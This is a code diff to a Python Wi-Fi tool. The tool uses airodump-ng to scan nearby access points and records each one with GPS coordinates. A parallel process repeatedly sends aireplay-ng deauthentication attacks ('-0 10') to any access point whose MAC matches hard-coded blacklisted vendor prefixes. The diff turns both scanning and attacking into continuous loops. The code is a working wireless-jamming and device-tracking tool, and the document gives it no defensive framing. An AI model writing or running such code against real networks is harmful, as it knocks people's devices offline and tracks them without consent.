@@ -47,28 +47,39 @@ def init():
         logger.addHandler(fh)
         logging.debug("started logging to file")
 
-def scan(netdb, interface):
+def scan(netdb, interface, loopscan):
     """
     Scan: Runs airodump-ng to characterize the environment.
     Returns: [string] containing the detected MAC addresses
     """
-    print("Begin scan")
-    # Setup the wireless interface to listen on
-    wifi = Airodump(interface)
-    wifi.start()  
-    scanres = wifi.tree
-    logging.debug("Got tree")
-    #Now add access points to db
-    #Get gps data
-    gpsdata = getlocation('/dev/ttyUSB1') #Change this to the GPS port
-
-    #mark devices inactive
-    netdb.mark_inactive()
-    for bssid in wifi.tree:
-        netdb.adddevice(bssid, wifi.tree[bssid]['ESSID'], wifi.tree[bssid]['Power'], 
-            wifi.tree[bssid]['channel'], wifi.tree[bssid]['Privacy'])
-        netdb.addlocation(bssid, gpsdata) #Get GPS coordinates.  This is a placeholder.        
-    wifi.stop()
+    loopthis = True
+    while (loopthis):
+        print("Begin scan")
+        # Setup the wireless interface to listen on
+        noresults = True
+        wifi = Airodump(interface)
+        wifi.start()
+        while (noresults):
+              
+            time.sleep(1)
+            scanres = wifi.tree
+            if (scanres == {}):
+                logging.debug("ERROR: No scan results...retrying")
+            else:
+                logging.debug("Got tree")
+                print("Scanres = ", scanres)
+                noresults = False
+        gpsdata = getlocation('/dev/ttyUSB1') #Change this to the GPS port
+        netdb.mark_inactive()
+        for bssid in wifi.tree:
+            netdb.adddevice(bssid, wifi.tree[bssid]['ESSID'], wifi.tree[bssid]['Power'], 
+                wifi.tree[bssid]['channel'], wifi.tree[bssid]['Privacy'])
+            netdb.addlocation(bssid, gpsdata) #Get GPS coordinates.  This is a placeholder.        
+        wifi.stop()
+        if (loopscan):
+            loopthis = True
+        else:
+            loopthis = False
     return []
 
 
@@ -96,28 +107,33 @@ def refine_targets(networks):
     return []
 
 
-def deauth_targets(netdb, wifi):
+def deauth_targets(netdb, wifi, deauth_loop):
     """
     Detauth Targets: Performs a replay attack against the listed targets
     Input: [(string,int)] with the (MAC,channel) to target
     """
-    logging.debug("deauth targets")
-    
-    #Get BSSIDs that match blacklist
-    attack_pairs = netdb.get_blacklisted()
-    logging.debug(attack_pairs)
-    foundpairs = False
-    for bssid in attack_pairs:
-        channel = str(bssid['channel'])
-        logging.debug("Blacklisting: " + bssid['bssid']  + " on channel " + channel)
-        #Set channel on device
-        call(["iwconfig",  wifi, "channel", channel])
-        call(["aireplay-ng", "-0", "10", "-a", bssid['bssid'], wifi])
-        foundpairs = True
-    logging.debug("Dauth targets completed")
-    if (foundpairs != True):
-	print("No targets found, sleeping 10 seconds")
-	time.sleep(10)
+    loopthis = True
+    while (loopthis):
+        logging.debug("deauth targets")
+        #Get BSSIDs that match blacklist
+        attack_pairs = netdb.get_blacklisted()
+        logging.debug(attack_pairs)
+        foundpairs = False
+        for bssid in attack_pairs:
+            channel = str(bssid['channel'])
+            logging.debug("Blacklisting: " + bssid['bssid']  + " on channel " + channel)
+            #Set channel on device
+            call(["iwconfig",  wifi, "channel", channel])
+            call(["aireplay-ng", "-0", "10", "-a", bssid['bssid'], wifi])
+            foundpairs = True
+        logging.debug("Dauth targets completed")
+        if (foundpairs != True):
+            print("No targets found, sleeping 5 seconds")
+            time.sleep(5)
+        if (deauth_loop):
+            loopthis = True
+        else:
+            loopthis = False
 
 def getlocation(gpsdevice): #Pass in gps interface
     #Get current location and return it as a key pair
@@ -170,31 +186,32 @@ def main():
     netdb.blacklist('90:03:B7:00:00:00')
     netdb.blacklist('00:26:7E:00:00:00')
     netdb.blacklist('00:12:1C:00:00:00')
-<
+
     #Configure the setup.  If using multiprocessing, you need to setup interface2
     multiprocessing = True
-    interface = 'mon0' #'wlp3s0' #Change this for the pi to something like wlan0
-    interface2 = 'wlps30'
+    interface = 'mon1' #'wlp3s0' #Change this for the pi to something like wlan0
+    interface2 = 'wlan0'
 
     #while True:
     if (multiprocessing):
         while True:
 
-            p1 = Process(target=scan, args=(netdb, interface))
+            p1 = Process(target=scan, args=(netdb, interface, True))
 
-            p2 = Process(target=deauth_targets, args=(netdb, interface2))
+            p2 = Process(target=deauth_targets, args=(netdb, interface2, True))
             p1.start()
             p2.start()
             #Wait to finish before looping
             p1.join()
             p2.join()
+            netdb.deviceswithlocations()
         logging.debug("Completed")
     else:
         while True:
-            networks = scan(netdb, interface)
+            networks = scan(netdb, interface, False)
             print ("scan complete")
             netdb.deviceswithlocations() #Show what was scanned
-            deauth_targets(netdb, interface)
+            deauth_targets(netdb, interface, False)
             #time.sleep(15)
             #targets = select_targets(networks)
             #if len(targets) > 0:
